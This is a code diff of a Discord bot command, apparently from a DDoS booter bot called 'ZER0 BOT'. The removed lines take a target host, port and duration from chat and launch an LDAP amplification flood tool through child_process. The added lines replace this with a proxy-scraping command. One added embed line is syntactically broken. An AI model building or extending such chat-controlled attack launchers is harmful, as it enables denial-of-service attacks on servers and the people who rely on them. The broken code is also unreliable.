@@ -17,7 +17,7 @@ if(!args[0]) {
 	const embed1 = new Discord.MessageEmbed()
 	.setColor('RANDOM')
 	.setTitle('WARRING')
-	.setDescription("`Ex ;home 1.1.1.1 80 60`")
+	.setDescription("`Ex ;scrape`")
 	.setFooter("Please do not attack government server!")
 	message.channel.send(embed1);
 	return;
@@ -25,7 +25,7 @@ if(!args[0]) {
 
 // Command attack
 var exec = require('child_process').exec
-exec(`./ldap ${host} ${port} ldap.txt 100 -1 ${duration}`, (error, stdout, stderr) => {
+exec(`python3 main.py`, (error, stdout, stderr) => {
 });
 
 // Start Attacking
@@ -36,7 +36,7 @@ const embed = new Discord.MessageEmbed()
 	.setColor('RANDOM')
 	.setTitle('🚀 **ZER0 BOT** 🚀')
 	.setTimestamp()
-  .setDescription("**𝓟𝓵𝓪𝓷**: `VIP 👨` \n **𝓣𝓪𝓻𝓰𝓮𝓽** : `" + host + "` \n **𝓟𝓸𝓻𝓽** : `" + port + "` \n **𝓜𝓮𝓽𝓱𝓸𝓭** : `HOME 💣` \n **𝓣𝓲𝓶𝓮** : `" + duration + "`")
+  .setDescription("SCRAPPING PROXY"`")
 	.setFooter('© Developer: zxcr9999#1770', client.user.avatarURL)
 	.setTimestamp()
 	.setImage(attackgif)
@@ -70,12 +70,12 @@ const embed = new Discord.MessageEmbed()
 exports.conf = {
   enabled: true,
   guildOnly: false,
-  aliases: ['home'],
+  aliases: ['scrape'],
   permLevel: 0
 }
 
 exports.help = {
-  name: 'home',
+  name: 'scrape',
   description: 'zxcr9999',
-  usage: 'home'
+  usage: 'scrape'
 }
